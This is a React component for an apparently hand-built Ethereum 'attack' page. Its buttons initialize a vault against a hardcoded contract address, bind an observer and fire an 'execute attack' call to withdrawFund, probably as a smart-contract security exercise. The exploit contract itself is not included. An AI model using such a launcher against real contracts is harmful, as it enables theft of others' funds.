import React, { Component } from 'react'
import {Form, Input, InputNumber, Modal, Layout, Alert, Button } from 'antd';

const FormItem = Form.Item;

import Common from './Common';

class Attack extends Component{

    constructor(props){
        super(props);
        this.state={showModal: false,
        host: '0x9bff611ca61a18fbcf0f179ecb59ffba00c70968'};
    }

    componentDidMount(){
      const {account, payroll} =this.props;

      payroll.owner.call({from: account})
      .then((result) => {
        this.setState({
          owner: result
        });
      })

      payroll.self.call({from: account})
      .then((result) => {
        this.setState({
          self: result
        });
      })
    }

    componentWillUnmount(){
    }

    initilizeVault=()=>{
      const {account, payroll} =this.props;
      const {host} = this.state;
      console.log("____"+host);
      payroll.initilizeVault(host, {
          from:account
      }).then((result)=>{
          console.log(result);
      });
    }

    startAttack=()=>{
        const {payroll, account} =this.props;
        payroll.withdrawFund({
            from:account
        }).then((result)=>{
          console.log(result);
        });
    }

    setObserver=()=>{
        const {payroll, account} =this.props;
        const {self} = this.state;
        console.log(self);
        payroll.setObserver(self,{
            from:account
        }).then((result)=>{
            //console.log(result);
        });
    }

    // onResolve=()=>{
    //     const {payroll, account} =this.props;
    //     payroll.onDestroy({
    //         from:account,
    //         gas:1000000
    //     }).then((result)=>{
    //         console.log(result);
    //     });
    // }

    addAuthorizedAccount=()=>{
        const {payroll, account} =this.props;
        const {position, address} = this.state;
        // console.log(address);
        // console.log(account);
        // console.log(host);
        payroll.addAuthorizedAccount(position, address, {
            from:account,
            gas:1000000
        }).then((result)=>{
            console.log(result);
        });
    }

    getWithdrawObserver=()=>{
        const {payroll, account} =this.props;
        payroll.getWithdrawObserver({
            from:account
        }).then((result)=>{
            console.log(result);
        });
    }

    getUpdateTime=()=>{
        const {payroll, account} =this.props;
        payroll.getLastUpdated({
            from:account
        }).then((result)=>{
            console.log(new Date(result.toNumber()*1000).toString())

        });
    }

    getAdditionalAuthorizedAccount=()=>{
        const {payroll, account} =this.props;
        payroll.getAdditionalAuthAddress({
            from:account
        }).then((result)=>{
            console.log(result)
            //console.log(result.toNumber())
        });
    }

    getTestValue=()=>{
      console.log('call getTestValue')
        const {payroll, account} =this.props;
        payroll.getAllAuthorizedUsers({
            from:account
        }).then((result)=>{
            console.log(result)
            //console.log(result.toNumber())
        });
    }



    renderModal() {
        return (
        <Modal
            title="新增认证账户"
            visible={this.state.showModal}
            onOk={this.addAuthorizedAccount}
            onCancel={() => this.setState({showModal: false})}
        >
        <Form>
            <FormItem label="地址">
              <Input
                value={this.state.address}
                onChange={ev => this.setState({address: ev.target.value})}
              />
            </FormItem>

            <FormItem label="顺序">
            <InputNumber
              value={this.state.position}
              min={0}
              onChange={position => this.setState({position})}
            />
            </FormItem>
          </Form>
        </Modal>
      );

    }

    render(){
      const { account, payroll, web3 } = this.props;
      const {owner} = this.state;
      if (owner !== account) {
        return <Alert message="你没有权限" type="error" showIcon />;
      }

      return (
        <Layout style={{ padding: '0 24px', background: '#fff', margin:'20px'}}>
          <Common account={account} payroll={payroll} web3={web3} />
          <h2>攻击老董</h2>

          {this.renderModal()}
          <div>
            <Form layout="inline">

            <FormItem>
            <Button
              type="primary"
              icon="reload"
              onClick={this.initilizeVault}
            >
              初始化
            </Button>
            </FormItem>

            <FormItem>
            <Button
              type="primary"
              icon="plus"
              onClick={this.setObserver}
            >
              绑定账户
            </Button>
            </FormItem>


              <FormItem>
              <Button
                type="primary"
                icon="rocket"
                onClick={this.startAttack}
                >
                执行攻击
              </Button>
              </FormItem>

              <FormItem>
              <Button
                type="primary"
                icon="user"
                onClick={this.getWithdrawObserver}
                >
                查看所属用户
              </Button>
              </FormItem>

              <FormItem>
              <Button
                type="primary"
                icon="clock-circle-o"
                onClick={this.getUpdateTime}
                >
                查看更新时间
              </Button>
              </FormItem>

              <FormItem>
              <Button
                type="primary"
                icon="clock-circle-o"
                onClick={this.getAdditionalAuthorizedAccount}
                >
                查看信任账户
              </Button>
              </FormItem>

              <FormItem>

              <Button
                type="primary"
                icon="check"
                onClick={this.getTestValue}
                >
                测试按钮
              </Button>
              </FormItem>
            </Form>
          </div>
        </Layout >
      );
    }

}

export default Attack;
